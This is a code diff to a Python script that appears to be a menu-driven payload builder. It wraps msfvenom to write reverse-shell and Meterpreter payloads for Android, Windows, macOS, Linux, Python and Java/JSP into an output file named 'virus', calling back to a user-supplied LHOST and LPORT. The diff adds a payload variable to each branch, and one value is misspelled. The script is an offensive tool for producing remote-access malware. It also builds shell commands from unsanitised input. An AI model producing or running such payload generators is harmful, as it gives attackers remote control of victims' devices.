@@ -126,6 +126,9 @@ if option == "1":
         print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
     
         print("")
+        
+        payload = "android/meterpreter/reverse_tcp"
+        
         subprocess.call("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
     
 else:
@@ -149,6 +152,9 @@ else:
         print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
         
         print("")
+        
+        payload = "windows/meterpreter/reverse_tcp"
+        
         subprocess.call("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
     else:
         if option == "3":
@@ -171,6 +177,9 @@ else:
             print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
         
             print("")
+            
+            payload = "osx/x86/shell_reverse_tcp"
+            
             subprocess.call("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
         
         else:
@@ -195,6 +204,9 @@ else:
                 print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
         
                 print("")
+            
+                payload = "linux/x86/meterpreteter/reverse_tcp"
+                
                 subprocess.call("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
             else:
                 if option == "5":
@@ -219,6 +231,9 @@ else:
                     print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
         
                     print("")
+            
+                    payload = "python/meterpreter/reverse_tcp"
+                    
                     subprocess.call("msfvenom -p python/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
                     
                 else:
@@ -244,6 +259,9 @@ else:
                         print(Fore.RED + "×=××==××==××==××==××==××==××==××==××==××==××==××==××=×")
         
                         print("")
+            
+                        payload = "java/jsp_shell_reverse_tcp"
+                        
                         subprocess.call("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -o " + virus , shell=True)
                         
                     else:
